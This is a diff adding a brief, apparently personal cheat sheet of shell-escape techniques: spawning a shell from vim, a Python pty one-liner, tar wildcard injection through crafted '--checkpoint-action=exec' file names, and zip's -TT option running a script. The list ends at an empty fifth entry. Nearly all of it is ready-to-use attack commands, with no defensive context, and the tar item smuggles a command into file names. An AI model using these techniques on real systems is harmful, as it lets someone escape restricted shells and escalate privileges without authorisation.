@@ -1,0 +1,19 @@
+[1] vim command shell.
+:set shell=/bin/bash
+:shell
+
+[2] python command shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+
+[3] tar command shell
+# Create files "--checkpoint=1", "--checkpoint-action=exec=sh shell.sh", "shell.sh"
+# In shell.sh is shell invocation
+#!/bin/bash
+/bin/bash
+$ tar -cf archive.tar *
+
+[4] zip command shell
+$ touch a
+$ zip z.zip a -T -TT ./shell.sh
+
+[5]
